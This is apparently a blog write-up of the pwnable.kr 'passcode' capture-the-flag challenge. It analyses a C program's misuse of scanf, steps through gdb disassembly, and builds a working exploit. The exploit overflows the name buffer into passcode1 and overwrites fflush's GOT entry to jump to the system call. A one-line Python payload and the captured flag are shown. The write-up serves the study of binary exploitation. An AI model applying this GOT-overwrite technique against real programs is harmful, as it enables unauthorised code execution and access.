---
title: "Basic Scanf Vulnerability"
excerpt: "pwnable.kr challenge: passcode"
date: 2020-03-06T09:24:19-05:00
categories:
 - pwn practice
---

# pwnable.kr: Intro to Scanf exploits

> Mommy told me to make a passcode based login system.
>
> My initial C code was compiled without any error!
>
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)

Initial thoughts on title challenge and hint:
* "passcode based login system" + title, going to have to try to "hack" something via passcode field entry?
* "some compiler warning ..." ok, whatever is in the source code is obvious enough that the compiler thinks it' stupid
* ... but still compiled, so

## Given

* SSH credentials to a box: `ssh passcode@pwnable.kr -p2222 (pw:guest)`

## First, get on the box

```bash
ssh passcode@pwnable.kr -p2222
```

## Look around

```bash
ls -alrt
...
-r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--   1 root root          858 Jun 26  2014 passcode.c
-r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag
...
```

We are `passcode`, in group(s):

```bash
passcode@pwnable:~$ id -Gn
passcode
```

So no `cat flag` :)

## Inspect files

So, imagine we're going to have to manipulate something we give to `passcode` to get to `flag`, and we are given the source code again.

## Run it

```bash
./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : gp
Welcome gp!
enter passcode1 : AAAAAAAA
enter passcode2 : checking...
Login Failed!
```

Hm, OK. So, it asks for a user name, and then once you enter that and hit enter, it prompts for a `passcode1`. Then, it proceeds to prompt for a `passcode2`, but consumes input before you get a chance to do anything. Sounds kinda like `nextInt` vs `next/nextLine` in Java, maybe? i.e it's fetching a newling from the first one. Though, why wouldn't that happen on the first passcode...

## Examine (given) source

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

OK - something of some size. Breaking it down;

## 3 functions

### main

Starts of with a `printf` for the welcome message. Then calls `welcome()` with no args.

### welcome

Starts of defining a char array of size 100 for the name, `char name[100];`, then uses `printf` to prompt for your name input.

Uses `scanf` with two args to read input into `name`.
* Arg one: `"%100s"`
* Arg two: `name`

[scanf man page](http://man7.org/linux/man-pages/man3/scanf.3.html).
>        s    Matches a sequence of non-white-space characters; the next
>             pointer must be a pointer to the initial element of a
>             character array that is long enough to hold the input sequence
>             and the terminating null byte ('\0'), which is added
>             automatically.  The input string stops at white space or at
>             the maximum field width, whichever occurs first.


OK - kinda smelling like a BOF of sorts. Continuing, it then prints our `name` and returns to main.

### main

Immediately calls `login()` with no arguments.

### login

Takes no args. Defines two `int`s: `passcode1` and `passcode2`.

`printf` to prompt for `passcode1`, and then uses `scanf` with two args to read input into `passcode1`:
* Arg one: `"%d"`
* Arg two: `passcode1`

Then it flushes the stdin with `fflush(stdin);`: [man page](https://linux.die.net/man/3/fflush)

> For input streams, fflush() discards any buffered data that has been fetched from the underlying file, but has not been consumed by the application.

So, seems like it should be getting rid of anything leftover in the buffer from the previous calls before.

Then it repeats the prompt/read for `passcode2`:

```c
  // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
  printf("enter passcode2 : ");
  scanf("%d", passcode2);
```

With a weird comment about 32 bit being vulnerable to guessing?

Maybe related to this [SO post about brute force 32 bit hashes](https://crypto.stackexchange.com/questions/34585/is-it-possible-to-brute-force-a-hash-algorithm-of-32-bits)
> ... Generating collisions for a 32-bit hash is trivial; thanks to birthday paradox, the expected effort is only about 217 hash evaluations...

Anyways, continuing on.

Lastly, it checks the values for `passcode1` and `passcode2` to see if they match two integers, and if so, give's us a shell:

```c
  printf("checking...\n");
  if(passcode1==338150 && passcode2==13371337){
    printf("Login OK!\n");
    system("/bin/cat flag");
  }
  else{
    printf("Login Failed!\n");
    exit(0);
  }
```

## takeaway

We need to somehow get the value of `passcode1` to be `338150` and we need the value of `passcode2` to be `13371337`.

First, the weird input stuff. Note: scanf width formatters eat whitespace if under the max width: [here](https://docs.microsoft.com/en-us/cpp/c-runtime-library/scanf-width-specification?view=vs-2019#the-width-field).

There's three scanf statements. First with `"%100s"`, then two with `"%d"` with a `fflush` between the second and third.

So, input buffer looks like this I would think:

```bash
input_buffer = []
# prompts for name
input_buffer = [my_name_here\n] --> read into char name[100], leaving:
input_buffer = [] # since the newline/whitespace occured before max width, it eats it

# prompts for passcode1
input_buffer = [my_passcode_1\n] --> read into passcode1, which now is just my_passcode_1, leaving:
input_buffer = [\n]

# prompts for passcode2
input_buffer[\n] --> read into passcode2 before we can press anything
```

So, that's that. Basically, we get one shot at whatever we have to do, via the `passcode1` field.

## Compiler warning
Prompt says something about a compiler warning, what if we try to compile it:

```c
clang passcode.c -o mypasscode
passcode.c:9:14: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode1);
               ~~   ^~~~~~~~~
passcode.c:14:21: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode2);
               ~~   ^~~~~~~~~
2 warnings generated.
```

Ooo - we're passing `int` for the passcodes instead of a pointer to it. So whatever we put for input for `passcode1` doesn't get written to the address of `passcode1`, it gets written to the value of `passcode1`, which could be wherever it sits in memory.

Smelling like a `peda` session.

## peda

Main:

```nasm
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048665 <+0>:	push   ebp
   0x08048666 <+1>:	mov    ebp,esp
   0x08048668 <+3>:	and    esp,0xfffffff0
   0x0804866b <+6>:	sub    esp,0x10
   0x0804866e <+9>:	mov    DWORD PTR [esp],0x80487f0
   0x08048675 <+16>:	call   0x8048450 <puts@plt>
   0x0804867a <+21>:	call   0x8048609 <welcome>
   0x0804867f <+26>:	call   0x8048564 <login>
   0x08048684 <+31>:	mov    DWORD PTR [esp],0x8048818
   0x0804868b <+38>:	call   0x8048450 <puts@plt>
   0x08048690 <+43>:	mov    eax,0x0
   0x08048695 <+48>:	leave
   0x08048696 <+49>:	ret
End of assembler dump.
```

So, probably want to look at:

```nasm
   0x0804867a <+21>:	call   0x8048609 <welcome>
   0x0804867f <+26>:	call   0x8048564 <login>
```

Which are own two functions for `welcome` and `login`.

`welcome`:

```nasm
disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   ebp
   0x0804860a <+1>:	mov    ebp,esp
   0x0804860c <+3>:	sub    esp,0x88
   0x08048612 <+9>:	mov    eax,gs:0x14
   0x08048618 <+15>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:	xor    eax,eax
   0x0804861d <+20>:	mov    eax,0x80487cb
   0x08048622 <+25>:	mov    DWORD PTR [esp],eax
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    eax,0x80487dd
   0x0804862f <+38>:	lea    edx,[ebp-0x70]
   0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:	mov    DWORD PTR [esp],eax
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    eax,0x80487e3
   0x08048643 <+58>:	lea    edx,[ebp-0x70]
   0x08048646 <+61>:	mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:	mov    DWORD PTR [esp],eax
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:	xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave
   0x08048664 <+91>:	ret
End of assembler dump.
```

Looking at this in depth.

## disas welcome

Recall, the source code:

```c
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

See [this page](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html) on guide to x86 assembly.

First, it initializes a new [stack frame](http://en.wikipedia.org/wiki/Call_stack).

* `push ebp` pushes whatever is in register `ebp` onto the stack. `ebp` stores the stack pointer. This stores the stack frame of the _calling_ function on the stack.
* `mov ebp, esp` takes the current stack pointer (`esp`) and uses it as the frame for the _called_ function.
* `sub esp,0x88` gives us some space for local variables (136 bytes, 0x88 is 136).
  * So, anything with a negative offest from the `%ebp%` register is a local variable for the function.
  * Anything with positive offset from `%ebp%` are parameters passed in.


Then, the following section sets-up the [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/). The specifics of the values/registers are explained pretty well [here](https://reverseengineering.stackexchange.com/a/6628):
> `gs` register gets initialized by the kernel to a percpu structure, which contains a random value that's intended to be used as stack canary...its at offset 20 (0x14) for 32 bit programs ...

* `mov eax,gs:0x14` is reading info into `eax` from memory at `gs:0x14`.
* `mov DWORD PTR [ebp-0xc],eax` is taking `eax` and storing it in the double word pointer at the memory value of the basepointer minus `0xc`.
* `xor eax,eax` just wipes eax to 0.

So, it's generating some random value, and then stuffing that into a variable. Kind of checks out with how you'd expect a canary to work.


```nasm
disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   ebp				; push ebp to the stack
   0x0804860a <+1>:	mov    ebp,esp				; copy stack pointer to base pointer
   0x0804860c <+3>:	sub    esp,0x88				; subtract 0x88 from the stack pointer (give us room for local vars)
---- set up our stack frame and give us room for local vars ^^^ ----
   0x08048612 <+9>:	mov    eax,gs:0x14			; initilize gs` register gets initialized by the kernel to a percpu structure, which contains a random value that's intended to be used as stack canary...its at offset 20 (0x14) for 32 bit programs ...
   0x08048618 <+15>:	mov    DWORD PTR [ebp-0xc],eax		; reading info into `eax` from memory at `gs:0x14`.
   0x0804861b <+18>:	xor    eax,eax				; wipe eax to 0
---- set stack canary ^^^ ----
   0x0804861d <+20>:	mov    eax,0x80487cb			; copy 0x80487cb to eax
   0x08048622 <+25>:	mov    DWORD PTR [esp],eax
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    eax,0x80487dd
---- setup info to call out to printf and then return ^^^ ----
   0x0804862f <+38>:	lea    edx,[ebp-0x70]			; This takes the contents of the basepoint minus 70 and loads into edx (this is the 'name' variable)
   0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:	mov    DWORD PTR [esp],eax
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    eax,0x80487e3
---- setup name variable in [ebp-0x70], and set up to call out to scanf and then return ^^^ ----
   0x08048643 <+58>:	lea    edx,[ebp-0x70]			; move name into edx
   0x08048646 <+61>:	mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:	mov    DWORD PTR [esp],eax
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
---- set up to call out to printf with name variable and then return ^^^ ----
   0x08048652 <+73>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:	xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
---- check stack canary, if good go to leave otherwise fail ^^^ ----
   0x08048663 <+90>:	leave
   0x08048664 <+91>:	ret
End of assembler dump.
```

## takeaway -- disas welcome

`name` looks to be stored at `[ebp-0x70]` in `welcome`.

## disas login

```c
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}
```

And:

```nasm
disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp                              ; set up base pointer+stack frame
   0x08048567 <+3>:	sub    esp,0x28                             ; local space
   0x0804856a <+6>:	mov    eax,0x8048770                        ; copy current addr to eax
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax              ;
   0x08048572 <+14>:	call   0x8048420 <printf@plt>           ; printf for enter passcode1
   0x08048577 <+19>:	mov    eax,0x8048783                    ; comeback to login
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]         ; copy the value at bp minus 10 to edx (so passcode1 is as bp-0x10)
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx          ; copy edx to sp+4
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax              ;
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>   ; scanf input
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]          ; passcode2 -- ebp-0xc
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6     ; passcode1==338150
   0x080485cc <+104>:	jne    0x80485f1 <login+141>            ; ... fail if not, else continue to
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9     ; passcode2==13371337
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>            ; ... fail+return to printf+quit
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>           ; shell to system
   0x080485ef <+139>:	leave
   0x080485f0 <+140>:	ret
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```

## takeways -- disas login

* `passcode1` is at `ebp-0x10`
* `passcode2` is at `ebp-0xc`

## back to peda

Set a break at `welcome`, then step until we see the call for our name:

```nasm
break *0x08048639

run
...
Breakpoint 1, 0x08048639 in welcome ()
# Check contents at bp minus 80, i.e. where we think name is going to go
x/-80wx $ebp
# break immediately after we enter our name
break *0x804863e
# enter our name
continue
Continuing.
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Check again
...
0xffffd658:	0xffffd674	0x00000002	0x080487dd	0xf7ffd940
0xffffd668:	0xf7e1a369	0x0804863e	0x080487dd	0xffffd688
0xffffd678:	0xffffd6f8	0xf7e42abf	0xf7faed20	0x080487f0
0xffffd688:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd698:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a8:	0x00414141	0xf7faf5e0	0xf7faed20	0x00000027
...
```

OK - filling it up:

```nasm
enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
0xffffd688:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd698:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e8:	0x00414141	0x6b5ab300	0xf7fae000	0xf7fae000
```

So it starts at the first word of `0xffffd688`. If we proceed and break after enter passcode1 in login, can see that it gets overwritten:

```nasm
0xffffd688:	0x41414141	0x6b5ab300	0x41414141	0x41414141
0xffffd698:	0x41414141	0x00000000	0xf7fae000	0xf7fae000
0xffffd6a8:	0xffffd6f8	0xf7e1a389	0xf7fae580	0x08048783
0xffffd6b8:	0xffffd6d4	0x00000002	0x41414141	0x41414141
0xffffd6c8:	0xf7e1a369	0x0804858b	0x08048783	0x00414141
0xffffd6d8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e8:	0x00414141
```

Looks like `name` sits at bp minus `0x70` and has length 100, so it ends at:

```python
>>> hex(100)
'0x64'
hex(0x70 - 0x64)
'0xc'
```

 but passcode1 sits in bp minus `0x10`, so the two overlap.

```python
(-0x70 + 0x64) - (-0x10)
4
```

So, we can use the last 4 bytes of `name` to set `passcode1`. _But_ we still can't do anything with passcode2.. hm.

We need to get straight to the `system` call, without trying to do anything with passcode2, since that's outta the question. Kind of strange that there's a `fflush` in there, which doesn't seem to be doing anything. Googling.

[System overlord blog -- any memory corruption primitive that will let you write to an arbitrary (attacker-controlled) address will allow you to overwrite a GOT entry](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

Since we have a dynamically linked executable:

```shell
passcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
```

It means that the library functions aren't stored in the program at compile time, and need to be one-time-looked-up when ran.

Turns out the `plt` that I thought was "program load time" (lol) was for [Procedure Linkage Table](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got).
> used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time

So - we can cheese the call to fflush to instead go straight to the address of the system call? By writing the value for the system call to what the entry for fflush is in the GOT?

New peda session, checking `disas fflush`:

```shell
disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:	jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:	push   0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.
```

So looks like it's going to `0x804a004`

And recall, our check and system call:

```nasm
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6     ; passcode1==338150
   0x080485cc <+104>:	jne    0x80485f1 <login+141>            ; ... fail if not, else continue to
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9     ; passcode2==13371337
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>            ; ... fail+return to printf+quit
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>           ; shell to system
```

So, when we call "fflush", we want to put a value into it such that we jump straight to the inside of the "good" if block.

`0x080485d7` seems like a good candidate to write to the address that gets jumped to when we interpret fflush (right after we've satisfied both the == checks):

```python
>>> 0x080485d7
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
134514135
```

So:

```shell
python -c "print 96*'A'+'\x04\xa0\x04\x08'+'134514135'" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : Login OK!
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
```

Bingo, flag is: `Sorry mom.. I got confused about scanf usage :(`.
